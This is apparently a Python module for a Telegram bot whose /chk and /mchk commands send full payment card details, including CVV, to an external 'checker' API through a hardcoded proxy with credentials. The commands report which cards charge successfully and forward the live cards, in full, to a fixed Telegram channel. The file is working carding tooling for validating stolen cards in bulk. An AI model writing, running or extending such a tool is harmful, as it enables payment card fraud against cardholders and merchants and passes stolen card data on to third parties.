from pyrogram import Client, filters
import requests
import json
from EQUROBOT import app

channel_id = '-1002196680748'  # Replace with your channel ID

# Helper function to divide the amount by 100
def divide_by_100(amount):
    return amount / 100 if amount else 0

# Command handler for /chk cc
@app.on_message(filters.command("chk"))
async def check_single_card(client, message):
    try:
        card_details = message.text.split()[1]
    except IndexError:
        await message.reply_text("Please provide card details in the format: /chk cc|mm|yyyy|cvv")
        return

    # API endpoint and parameters
    url = "https://freechecker.hrk.dev/checker"
    params = {
        'cc': card_details,
        'proxy': "50.3.137.177:12345:tickets:proxyon145"  # Replace with your proxy if needed
    }

    # Make the API request
    response = requests.get(url, params=params)
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        await message.reply_text(f"Failed to decode response for {card_details}.\nResponse text: {response.text}")
        return

    # Process the response
    payment_info = response_json.get('payment', {})
    status = payment_info.get('status', 'failed')
    amount = payment_info.get('amount', 0)
    divided_amount = divide_by_100(amount)
    currency = payment_info.get('currency', 'UNKNOWN')
    intent = payment_info.get('intent', 'UNKNOWN')

    if status == 'succeeded':
        success_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CHARGE {divided_amount} {currency} ✅\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card_details}`\n"
                           f"➩ RESPONSE: *Payment Successful!✅*\n"
                           f"➩ PAYMENT INTENT ID: `{intent}`\n"
                           f"➩ AMOUNT: `{divided_amount}` `{currency}`\n\n")
        await message.reply_text(success_message)
        await client.send_message(channel_id, success_message)
    else:
        await message.reply_text(f"Card declined: {card_details}")

# Command handler for /mchk
@app.on_message(filters.command("mchk"))
async def check_multiple_cards(client, message):
    card_details_list = message.text.split()[1:]
    num_cards = len(card_details_list)

    if num_cards < 1 or num_cards > 10:
        await message.reply_text("Please provide between 1 and 10 card details in the format: /mchk cc1|mm1|yyyy1|cvv1 cc2|mm2|yyyy2|cvv2 ...")
        return

    total_cards = num_cards
    checked_cards = 0
    live_cards = 0
    charged_cards = []
    user_counts = {'charged_cc_count': 0, 'checked_cc_count': 0, 'total_cc_count': total_cards}

    for card_details in card_details_list:
        card_details = card_details.strip()
        if not card_details:
            continue

        # API endpoint and parameters
        url = "https://freechecker.hrk.dev/checker"
        params = {
            'cc': card_details,
            'proxy': "50.3.137.177:12345:tickets:proxyon145"  # Replace with your proxy if needed
        }

        # Make the API request
        response = requests.get(url, params=params)
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            continue

        # Process the response
        payment_info = response_json.get('payment', {})
        status = payment_info.get('status', 'failed')
        amount = payment_info.get('amount', 0)
        divided_amount = divide_by_100(amount)
        currency = payment_info.get('currency', 'UNKNOWN')
        intent = payment_info.get('intent', 'UNKNOWN')

        if status == 'succeeded':
            live_cards += 1
            charged_cards.append((card_details, divided_amount, currency, intent))
            user_counts['charged_cc_count'] += 1

        checked_cards += 1
        user_counts['checked_cc_count'] = checked_cards

    # Send summary of the processed cards
    summary_text = (f"┏━━━━━━━⍟\n"
                    f"┃ Total Cards Checked: {checked_cards}\n"
                    f"┃ Live Cards: {live_cards}\n"
                    f"┗━━━━━━━━━━━⊛")
    await message.reply_text(summary_text)

    # Send details of the charged cards
    for card, amount, currency, intent in charged_cards:
        success_message = (f"┏━━━━━━━⍟\n"
                           f"┃ CHARGE {amount} {currency} ✅\n"
                           f"┗━━━━━━━━━━━⊛\n"
                           f"➩ CARD: `{card}`\n"
                           f"➩ RESPONSE: *Payment Successful!✅*\n"
                           f"➩ PAYMENT INTENT ID: `{intent}`\n"
                           f"➩ AMOUNT: `{amount}` `{currency}`\n\n")
        await client.send_message(channel_id, success_message)
        await message.reply_text(success_message)
